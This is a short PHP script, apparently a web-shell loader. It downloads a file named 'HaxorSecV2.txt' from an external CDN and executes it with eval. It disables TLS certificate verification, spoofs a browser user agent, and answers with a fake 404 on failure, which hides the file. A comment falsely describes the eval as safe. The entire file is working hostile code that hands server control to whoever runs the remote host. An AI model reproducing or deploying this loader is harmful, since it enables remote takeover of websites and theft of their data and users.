<?php

function get_contents($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Untuk PHP < 5.6.40
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // Untuk PHP < 5.6.40

    $result = curl_exec($ch);

    if ($result === false) {
        echo 'Curl error: ' . curl_error($ch);
        http_response_code(404); // Tampilkan error 404 jika gagal
        curl_close($ch);
        exit;
    }

    curl_close($ch);
    return $result;
}

// URL file eksternal
$url = 'https://cdn.privdayz.com/txt/HaxorSecV2.txt';
$encoded_code = get_contents($url);

if ($encoded_code === false) {
    http_response_code(404);
    exit;
}

// Untuk debugging (opsional)
// echo $encoded_code;

// Evaluasi kode hasil fetch dengan aman
eval('?>' . $encoded_code);
?>